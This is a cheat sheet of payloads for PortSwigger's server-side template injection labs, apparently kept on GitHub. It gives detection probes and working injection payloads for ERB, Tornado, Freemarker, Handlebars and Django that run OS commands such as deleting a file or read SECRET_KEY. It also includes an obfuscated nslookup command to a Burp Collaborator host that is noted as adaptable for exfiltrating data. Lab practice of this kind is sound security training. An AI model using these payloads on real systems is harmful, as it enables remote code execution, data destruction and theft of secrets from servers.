# Server-Side Template Injection

## Summary

* [Recon for Server-Side Template Injection](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

* Additional Note: There is a PDF attached in this folder that has a walk-through of the labs. The document does not need to be downloaded, it can be viewed inline in GitHub.

<br><br>

## Recon

* Detect and identify server-side template injection:

    * https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack
 
 * Some payloads to try:

   * {{7*7}}
   * ${7*7}
   * <%=7*7%>
   * ${7*test}
   * {{this}}{{self}}

   * ${{<%[%'"}}%\

<br><br>

## Cheat Sheet

<br><br>

PayloadAllTheThings:

* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses
  
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

<br>

**For more Obfuscation related payloads check out the "Command Injection" folder of this cheatsheet.**

<br>

Obfuscation example (this can be helpful to bypass filtering):  

This will append the String "hello" to Burp Collaborator.  This can be changed to exfiltrate data.  

```
<%system("nslookup $(e`echo ch`o hello).yvxfjnpedf14.oastify.com")%>
```

<br><br>

### __Basic Server-side Template Injection__

* Ruby ERB Template Syntax

    * Payload:  <%=7*7%>

* If the payload was successful, then in the response we should see the value of 49.

* The following payload can be used to execute an OS command that deletes a file from the server:

    * Payload:

```
<%system("rm /home/carlos/morale.txt")%>
```

* Other payloads for enumeration:

    * {{7*7}}

    * ${7*7}

* Resources:

    * https://docs.ruby-lang.org/en/2.3.0/ERB.html

    * https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html

<br><br>

### __Basic Server-side Template Injection (Code Context)__

* Tornado web Template Engine

* Try to trigger an error message in the application.  Sometimes the application will disclose the template that it is using.

* Some payloads to try:

    * {{7*7}}

    * ${7*7}

* The syntax needs to be valid for successfully execution of the payload:

    * Payload:  }}{{7*7

* This payload will return the value of 49.

* The following payload can be used to execute an OS command that deletes a file from the server:

    * Payload:

```
}}{%import+os%}{{os.system("rm+/home/carlos/morale.txt")
```

* Resources:

    * https://www.tornadoweb.org/en/stable/template.html

<br><br>

### __Server-side Template Injection Using Documentation__

* Freemarker Template Engine

* Trigger an overly verbose error message on the application, which discloses the template engine in use.

    * ${7*test}

* The following payload can be used to execute an OS command that deletes a file from the server:

    * Payload:  <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }

* Resources:

    * https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security

    * https://portswigger.net/research/server-side-template-injection


<br><br>

### __Server-side Template Injection with a Documented Exploit__

* Handlebars Template Engine 

* Resource:

    * http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

* Identification Payload:

    * {{this}}{{self}}

* Using the payload mentioned in the resource, swap out the following line of code:

    * return JSON.stringify(process.env);

* Then inject either of the following payloads in its place, then URL encode the entire payload String before submitting the payload back to the application:

    * return require('child_process').execSync('rm /home/carlos/morale.txt');

    * return require('child_process').exec('rm /home/carlos/morale.txt');


<br><br>

### __Server-side Template Injection with Information Disclosure via User-supplied Objects__

* Django Template Engine

* Payload to disclose debug information:

    * {% debug %}

* The “settings” Object can be used to retrieve sensitive information from the template engine configuration.

    * Payload:  {{settings.SECRET_KEY}}


<br><br>

### __Server-side template injection in a sandboxed environment__

* See lab/document information. - https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment

<br><br>

### __Server-side template injection with a custom exploit__

* See lab/document information. - https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit

<br><br>

### __Pending to complete labs that are missing from cheat sheet:__

* All labs in this category are completed and referenced in cheat sheet or attached document.
